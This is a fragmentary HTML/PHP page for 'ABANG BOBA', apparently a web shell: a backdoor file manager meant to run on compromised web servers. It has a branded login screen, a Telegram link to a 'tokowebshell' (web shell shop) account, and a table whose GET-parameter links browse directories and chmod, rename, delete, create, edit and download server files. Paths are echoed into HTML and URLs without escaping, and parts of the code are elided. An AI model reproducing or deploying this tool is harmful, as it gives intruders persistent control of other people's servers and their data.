...
<head>
  ...
  <title>LOGIN — ABANG BOBA</title>
  <meta name="description" content="Halaman login untuk akses ABANG BOBA.">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Bungee+Tint&family=Courgette&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #121212;
      --card: #1e1e1e;
      ...
      --font-heading: 'Bungee Tint', cursive;
      --font-msg: 'Courgette', cursive;
    }
...
<body>
  <div class="wrapper">
    <div class="brand">
      <img src="https://i.ibb.co.com/4Mmcv0w/zz-removebg-preview.png" alt="Logo Abang Boba">
      <h1>ABANG BOBA</h1>
      <p>
        Jika gagal jangan nangis.<br>
        Jika berhasil jangan sombong.<br>
        Tidak ada karangan bunga dalam hidup laki‑laki kecuali
        <strong style="color: var(--accent);">kematiannya.</strong>
      </p>
      <a href="https://t.me/tokowebshell" target="_blank" rel="noopener">TELEGRAM CONTACT ME</a>
    </div>
    <div class="login-box">
      <h2>Masuk</h2>
                ...
                <div class="p-4 rounded-3">
                    ...
                    <div class="table-responsive mt-3">
                        <table class="table table-hover table-dark align-middle text-light">
                            ...
                            <style>
  /* letakkan ini di file CSS Anda atau di <head> */
  .info-container {
    position: relative;
    background: #1e1e1e;
    padding: 1rem;
...
<div class="info-container">
  <div class="brand">ABANG BOBA</div>
  <table class="table text-nowrap">
    <tbody>
      ...
      <tr>
        <td>
          <?php if ($dir === '..') : ?>
            <a href="?dir=<?= dirname($path) ?>" class="text-decoration-none text-light">
              <i class="fa fa-folder-open"></i> <?= $dir ?>
            </a>
          <?php elseif ($dir === '.') : ?>
            <a href="?dir=<?= $path ?>" class="text-decoration-none text-light">
              <i class="fa fa-folder-open"></i> <?= $dir ?>
            </a>
          <?php else : ?>
            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light">
        ...
        <td class="text-light">
          <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod">
            <?php
        ...
        <td>
          <?php if ($dir !== '.' && $dir !== '..') : ?>
            <div class="btn-group">
              <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" title="Rename">
                <i class="fa fa-edit"></i>
              </a>
              <a href="#" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" class="btn btn-outline-light btn-sm" title="Delete">
                <i class="fa fa-trash"></i>
              </a>
            </div>
          <?php else : ?>
            <div class="btn-group">
              <a data-bs-toggle="collapse" href="#newFolderCollapse" class="btn btn-outline-light btn-sm mr-1" title="New Folder">
                <i class="fa fa-folder-plus"></i>
              </a>
              <a data-bs-toggle="collapse" href="#newFileCollapse" class="btn btn-outline-light btn-sm" title="New File">
      ...
      <tr>
        <td>
          <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="text-decoration-none text-light">
            <i class="fa fa-file-code"></i> <?= $dir ?>
          </a>
        </td>
        <td class="text-light">
        ...
        <td>
          <div class="btn-group">
            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1" title="Edit">
              <i class="fa fa-file-edit"></i>
            </a>
            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=download" class="btn btn-outline-light btn-sm mr-1" title="Download">
